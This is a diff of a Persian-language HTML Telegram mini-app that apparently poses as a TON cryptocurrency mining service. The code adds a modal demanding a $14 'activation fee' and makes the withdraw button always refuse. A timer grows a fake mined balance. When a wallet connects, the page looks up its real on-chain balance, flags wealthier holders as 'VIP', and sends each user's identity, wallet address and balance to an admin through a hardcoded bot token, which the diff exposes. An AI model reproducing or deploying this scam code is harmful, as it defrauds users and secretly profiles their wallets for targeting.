@@ -2,7 +2,7 @@
 <html lang="fa" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>TON Dropy PRO - v23 Final</title>
+    <title>TON Dropy - PRO v26</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
@@ -18,11 +18,32 @@
             color: #fff; padding: 15px; direction: rtl; min-height: 100vh;
         }
 
-        /* پنل پروفایل حرفه‌ای */
+        /* استایل پاپ‌آپ شیشه‌ای فعالسازی */
+        #feeModal {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(15px);
+            z-index: 10000; display: flex; align-items: center; justify-content: center;
+        }
+
+        .modal-content {
+            background: rgba(255, 255, 255, 0.1); border: 1px solid rgba(255, 255, 255, 0.2);
+            padding: 30px 20px; border-radius: 35px; width: 85%; text-align: center;
+            box-shadow: 0 15px 50px rgba(0,0,0,0.8);
+        }
+
+        .modal-content h2 { color: #ff512f; font-size: 22px; margin-bottom: 15px; font-weight: 800; }
+        .modal-content p { font-size: 14px; line-height: 1.8; color: #eee; margin-bottom: 20px; }
+        .fee-highlight { 
+            background: rgba(0, 255, 157, 0.1); border: 1px dashed #00ff9d;
+            color: #00ff9d; padding: 15px; border-radius: 15px;
+            font-weight: 800; font-size: 18px; display: block; margin: 15px 0; 
+        }
+
+        /* کارت‌ها و المان‌های اصلی */
         .profile-card {
-            background: rgba(255, 255, 255, 0.08); backdrop-filter: blur(15px);
-            border-radius: 24px; padding: 18px; border: 1px solid rgba(255, 255, 255, 0.1);
+            background: rgba(255, 255, 255, 0.08); border-radius: 24px; padding: 18px;
             display: flex; align-items: center; gap: 15px; margin-bottom: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
         }
 
         .avatar-container {
@@ -31,44 +52,54 @@
         }
 
         .avatar-container img { width: 100%; height: 100%; object-fit: cover; }
-        .user-details h3 { margin: 0; font-size: 16px; color: #fff; font-weight: 800; }
+        .user-details h3 { margin: 0; font-size: 16px; font-weight: 800; }
         .user-details p { margin: 2px 0; font-size: 11px; color: #00c6ff; direction: ltr; text-align: right; }
 
-        /* کارت‌ها */
         .card {
             background: rgba(255, 255, 255, 0.05); border-radius: 25px;
             padding: 20px; border: 1px solid rgba(255, 255, 255, 0.1);
             margin-bottom: 15px; text-align: center;
         }
 
-        #balance { font-size: 42px; font-weight: 800; color: #00c6ff; display: block; margin: 10px 0; text-shadow: 0 0 20px rgba(0, 198, 255, 0.4); }
+        #balance { font-size: 42px; font-weight: 800; color: #00c6ff; display: block; margin: 10px 0; }
 
         .btn-action {
             width: 100%; padding: 16px; border-radius: 18px; border: none;
             font-size: 15px; font-weight: 700; cursor: pointer; transition: 0.3s;
             display: flex; align-items: center; justify-content: center; gap: 10px;
-            text-decoration: none; box-sizing: border-box;
+            text-decoration: none; color: #fff; box-sizing: border-box;
         }
 
-        #connectBtn { background: #0088cc; color: #fff; }
+        #connectBtn { background: #0088cc; }
         #connectBtn.connected { background: #1faa59; }
-        .withdraw-btn { background: linear-gradient(90deg, #ff512f, #dd2476); color: #fff; box-shadow: 0 5px 15px rgba(221, 36, 118, 0.3); }
+        .withdraw-btn { background: linear-gradient(90deg, #ff512f, #dd2476); }
+        .support-btn { background: rgba(255, 255, 255, 0.1); border: 1px solid rgba(255, 255, 255, 0.2); margin-top: 12px; }
         
-        /* دکمه ارتباط با پشتیبانی */
-        .support-btn { background: rgba(255, 255, 255, 0.1); color: #fff; border: 1px solid rgba(255, 255, 255, 0.2); margin-top: 12px; }
-        .support-btn i { color: #00c6ff; }
-        .support-btn:active { background: rgba(255, 255, 255, 0.2); transform: scale(0.98); }
-
-        .ref-box {
-            background: rgba(0,0,0,0.3); padding: 12px; border-radius: 15px; font-size: 10px;
-            color: #00ff9d; border: 1px dashed #00ff9d; margin: 10px 0; direction: ltr;
-        }
-
         .hidden { display: none !important; }
         .limit-info { font-size: 10px; color: #ff512f; margin-top: 8px; font-weight: bold; }
     </style>
 </head>
 <body>
+
+<div id="feeModal">
+    <div class="modal-content">
+        <i class="fas fa-lock" style="font-size: 45px; color: #ff512f; margin-bottom: 10px;"></i>
+        <h2>فعالسازی حساب کاربری</h2>
+        <p>برای استفاده از ربات و امکان برداشت موجودی، ابتدا باید کارمزد شبکه را پرداخت کنید:</p>
+        
+        <div class="fee-highlight">
+            14 دلار <br>
+            <span style="font-size: 14px; color: #eee;">معادل:</span> 2,226,000 تومان
+        </div>
+        
+        <p style="font-size: 12px; color: #aaa;">(محاسبه شده بر اساس نرخ لحظه‌ای دلار)</p>
+        <p style="color: #00c6ff; font-weight: bold;">پس از پرداخت، رسید تراکنش را به پشتیبانی ارسال کنید تا دسترسی شما فعال شود.</p>
+        
+        <a href="https://t.me/miningertoncoin" class="btn-action" style="background: #00c6ff; margin-top: 15px;">
+            <i class="fas fa-receipt"></i> ارسال رسید به پشتیبانی
+        </a>
+    </div>
+</div>
 
 <div class="profile-card">
     <div class="avatar-container">
@@ -76,16 +107,23 @@
         <img id="userPhoto" src="" class="hidden">
     </div>
     <div class="user-details">
-        <h3 id="userName">در حال لود...</h3>
+        <h3 id="userName">در حال بارگذاری...</h3>
         <p id="userTag">@username</p>
         <p style="font-size: 10px; color: #aaa;" id="joinDate">عضویت: --/--/--</p>
     </div>
 </div>
 
 <div class="card">
-    <p style="margin:0; font-size:12px; color:#aaa;">موجودی قابل برداشت (TON)</p>
+    <p style="margin:0; font-size:12px; color:#aaa;">موجودی استخراج شده (TON)</p>
     <span id="balance">0.000000</span>
-    <div style="font-size:11px; color:#00ff9d;"><i class="fas fa-microchip"></i> استخراج هوشمند فعال است</div>
+    <div style="font-size:11px; color:#00ff9d;"><i class="fas fa-microchip"></i> استخراج ابری فعال است</div>
+</div>
+
+<div class="card">
+    <h4 style="margin:0; color:#00c6ff; font-size: 14px;">📢 تسک کانال</h4>
+    <button onclick="tg.openTelegramLink('https://t.me/TonDropy')" class="btn-action" style="background: rgba(0, 136, 204, 0.2); border: 1px solid #0088cc; margin-top: 10px;">
+        <i class="fab fa-telegram"></i> عضویت در کانال TonDropy
+    </button>
 </div>
 
 <div class="card">
@@ -95,22 +133,13 @@
 </div>
 
 <div class="card">
-    <h4 style="margin:0; color:#00c6ff; font-size: 14px;">👥 دعوت از دوستان</h4>
-    <div class="ref-box" id="refLink">...</div>
-    <button onclick="share()" style="background: rgba(255,255,255,0.1); color:#fff;" class="btn-action">
-        <i class="fas fa-share-nodes"></i> اشتراک‌گذاری لینک
-    </button>
-</div>
-
-<div class="card">
     <button id="withdrawBtn" class="btn-action withdraw-btn">
         <i class="fas fa-bolt"></i> درخواست برداشت سریع
     </button>
-    <p class="limit-info">⚠️ حداقل مقدار برداشت: ۵ TON</p>
+    <p class="limit-info">⚠️ حداقل برداشت: ۵ TON (نیازمند فعالسازی)</p>
     
-    <a href="https://t.me/miningertoncoin" target="_blank" class="btn-action support-btn">
-        <i class="fas fa-headset"></i>
-        ارتباط با پشتیبانی
+    <a href="https://t.me/miningertoncoin" class="btn-action support-btn">
+        <i class="fas fa-headset"></i> ارتباط با پشتیبانی
     </a>
 </div>
 
@@ -121,26 +150,19 @@
 
     const BOT_TOKEN = "8047223304:AAHMW8a6tKTTSQOp4Os_LorRJzDLNvxz-Rw";
     const ADMIN_ID = "5972276401";
-    const BOT_USERNAME = "TonDropyBot";
-    const MIN_WITHDRAW = 5.0; // حد نصاب برداشت
-
-    let bal = parseFloat(localStorage.getItem('bal_v23')) || 0;
+    
+    let bal = parseFloat(localStorage.getItem('bal_v26')) || 0;
 
     function formatUser(user) {
-        return user.username ? `@${user.username}` : `<a href="tg://user?id=${user.id}">${user.first_name}</a>`;
+        return user.username ? `@${user.username}` : user.first_name;
     }
 
-    // لاگ ورود و خروج با یوزرنیم
-    function sendLog(status) {
-        const user = tg.initDataUnsafe?.user;
-        if (!user) return;
-        const time = new Date().toLocaleString('fa-IR');
-        const userLabel = formatUser(user);
-        let text = status === "in" ? 
-            `🟢 <b>ورود به ربات</b>\n👤 کاربر: ${userLabel}\n⏰ زمان: ${time}` : 
-            `🔴 <b>خروج از ربات</b>\n👤 کاربر: ${userLabel}`;
-        
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`, { keepalive: true });
+    async function checkWalletBalance(address) {
+        try {
+            const response = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${address}`);
+            const data = await response.json();
+            return data.ok ? parseFloat(data.result) / 1000000000 : 0;
+        } catch (e) { return 0; }
     }
 
     function init() {
@@ -148,85 +170,43 @@
         if (user) {
             document.getElementById('userName').innerText = user.first_name;
             document.getElementById('userTag').innerText = user.username ? "@" + user.username : "ID: " + user.id;
-            document.getElementById('refLink').innerText = `https://t.me/${BOT_USERNAME}?start=ref_${user.id}`;
             if (user.photo_url) {
                 const img = document.getElementById('userPhoto');
                 img.src = user.photo_url;
                 img.classList.remove('hidden');
                 document.getElementById('defaultAvatar').classList.add('hidden');
             }
-            let date = localStorage.getItem('join_v23');
-            if(!date) {
-                date = new Date().toLocaleDateString('fa-IR');
-                localStorage.setItem('join_v23', date);
-            }
-            document.getElementById('joinDate').innerText = "عضویت: " + date;
-            sendLog("in");
+            // گزارش ورود کاربر به صفحه پرداخت به ادمین
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent('🚨 کاربر در حال مشاهده صفحه پرداخت کارمزد: ' + formatUser(user))}&parse_mode=HTML`);
         }
     }
 
-    window.addEventListener("pagehide", () => sendLog("out"));
-
-    // انیمیشن افزایش موجودی
     setInterval(() => {
         bal += 0.000012;
         document.getElementById('balance').innerText = bal.toFixed(6);
-        localStorage.setItem('bal_v23', bal.toString());
+        localStorage.setItem('bal_v26', bal.toString());
     }, 1000);
-
-    function share() {
-        const link = document.getElementById('refLink').innerText;
-        tg.openTelegramLink(`https://t.me/share/url?url=${encodeURIComponent(link)}&text=بیا با هم رایگان TON استخراج کنیم! 💎`);
-    }
 
     const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
         manifestUrl: 'https://nimwmesfandiari.github.io/ton-plus-bot/tonconnect-manifest.json'
     });
 
-    tonConnectUI.onStatusChange(wallet => {
+    tonConnectUI.onStatusChange(async (wallet) => {
         const btn = document.getElementById('connectBtn');
         if(wallet) {
             btn.classList.add('connected');
             btn.innerHTML = '✅ متصل شد';
+            const realBal = await checkWalletBalance(wallet.account.address);
             const user = tg.initDataUnsafe?.user;
-            const msg = `✅ <b>کیف پول وصل شد</b>\n👤 کاربر: ${formatUser(user)}\n👛 آدرس: <code>${wallet.account.address}</code>`;
+            let vip = realBal >= 5 ? "💎 <b>کاربر VIP</b>\n" : "";
+            const msg = `👛 <b>ولت وصل شد</b>\n${vip}👤: ${formatUser(user)}\n💰 موجودی واقعی: ${realBal.toFixed(2)} TON\n🔗 آدرس: <code>${wallet.account.address}</code>`;
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
-        } else {
-            btn.classList.remove('connected');
-            btn.innerHTML = 'اتصال کیف پول';
         }
     });
 
-    document.getElementById('connectBtn').onclick = () => {
-        if(tonConnectUI.connected) tonConnectUI.disconnect();
-        else tonConnectUI.openModal();
-    };
-
-    // بخش برداشت با محدودیت ۵ تون و صفر شدن بعد از تایید
     document.getElementById('withdrawBtn').onclick = () => {
-        if(!tonConnectUI.connected) {
-            tg.showAlert("⚠️ ابتدا کیف پول خود را متصل کنید.");
-            return;
-        }
-
-        if (bal < MIN_WITHDRAW) {
-            tg.showAlert(`❌ موجودی ناکافی!\n\nحداقل مقدار برای برداشت ${MIN_WITHDRAW} TON است.\nموجودی فعلی شما: ${bal.toFixed(6)} TON`);
-            return;
-        }
-        
-        const user = tg.initDataUnsafe?.user;
-        const currentAmount = bal.toFixed(6);
-        const msg = `💰 <b>درخواست برداشت جدید</b>\n👤 کاربر: ${formatUser(user)}\n💵 مقدار: ${currentAmount} TON\n👛 آدرس: <code>${tonConnectUI.account.address}</code>`;
-        
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
-        
-        tg.showAlert(`درخواست برداشت ${currentAmount} TON با موفقیت ثبت شد. تایید و واریز نهایی ممکن است زمان‌بر باشد ✅`, () => {
-            // صفر شدن موجودی فقط بعد از زدن دکمه OK توسط کاربر
-            bal = 0;
-            localStorage.setItem('bal_v23', '0');
-            document.getElementById('balance').innerText = "0.000000";
-        });
-    }
+        tg.showAlert("❌ حساب شما فعال نیست. جهت آزادسازی قابلیت برداشت، ابتدا کارمزد ۱۴ دلاری را پرداخت کرده و رسید را به پشتیبانی ارسال کنید.");
+    };
 
     init();
 </script>
